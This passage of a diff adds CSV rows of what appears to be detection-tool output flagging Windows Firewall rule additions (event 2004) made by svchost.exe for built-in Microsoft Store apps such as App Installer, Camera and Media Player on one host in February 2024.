+RuleName: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:55:46.140091+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,641,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{7A984EF9-5103-4D25-9B23-6D78F5ECAEEA}'
+RuleName: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:55:46.141341+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,642,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{ECC7B6D1-25E6-43C8-ABC0-52B93D332ABB}'
+RuleName: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:55:46.143024+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,643,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{A5B8C49F-871A-439C-84F1-D53F909DB83F}'
+RuleName: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:55:46.144864+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,644,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{53DC1254-6DA1-438F-A0B8-8FD6E6FC1C0E}'
+RuleName: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:55:46.147079+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,645,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{71C3089B-82E8-4380-AFC5-4AB33B79B534}'
+RuleName: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:57:49.505716+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,654,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{5CF498AE-1AED-4395-B947-74FACF9A5CC3}'
+RuleName: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:57:49.506983+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,655,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{4C31591D-6DCB-4A55-A8FB-BDA59095BD30}'
+RuleName: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:57:49.508168+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,656,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{860A71A9-CB79-4E7D-8A17-6BECC6078FEF}'
+RuleName: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:57:49.509158+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,657,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{EB4635D3-32BD-4314-BE9E-128AFFF04D76}'
+RuleName: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:57:49.509996+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,658,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{FD4B2B8F-2A50-4C9A-9B41-147B982B9AE6}'
+RuleName: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:57:49.511294+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,659,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{4CA224C5-20D7-4902-B750-E4EA1E8E2C9B}'
+RuleName: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:57:49.512690+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,660,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{183FAD16-1631-46EC-8817-68C582652BE8}'
+RuleName: '@{Microsoft.StorePurchaseApp_22312.1401.1.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:58:01.172519+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,667,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsCamera_2023.2312.3.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCamera/LensSDK/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{1DA417C2-C158-4708-AF7C-A513B4430D76}'
+RuleName: '@{Microsoft.WindowsCamera_2023.2312.3.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCamera/LensSDK/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:58:01.174066+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,668,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsCamera_2023.2312.3.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCamera/LensSDK/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{5FEFCFE5-5A5C-4F22-92E2-F757AC5DE92B}'
+RuleName: '@{Microsoft.WindowsCamera_2023.2312.3.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCamera/LensSDK/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:00:12.915546+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,679,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.GetHelp_10.2308.12552.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{867764CD-2B27-42E4-92FA-95BE1EF4247B}'
+RuleName: '@{Microsoft.GetHelp_10.2308.12552.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:00:12.917154+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,680,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.GetHelp_10.2308.12552.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{A3A76448-BA15-4D6C-AEF0-7FCFF8BEA1FF}'
+RuleName: '@{Microsoft.GetHelp_10.2308.12552.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.GetHelp/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:01:18.149582+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,697,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F831ADC2-E3DB-4A58-BCBA-8A8FCE4B404B}'
+RuleName: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:01:18.150594+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,698,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{737EF79F-B8B2-4C17-8ACA-6B91F063D337}'
+RuleName: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:01:18.151395+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,699,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{336216A4-B93D-4B59-93EB-D1FE0AD8DE76}'
+RuleName: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T05:01:18.153112+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,700,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{6C2E109A-7C7F-4CB3-8815-E43F668FA79E}'
+RuleName: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T05:01:18.155120+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,701,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{572A2DBB-4485-48B8-A9E5-6EB1A10CACB4}'
+RuleName: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:01:18.156127+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,702,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{1DFA0ADF-0F89-4C39-82BB-3BBA18DDA15D}'
+RuleName: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
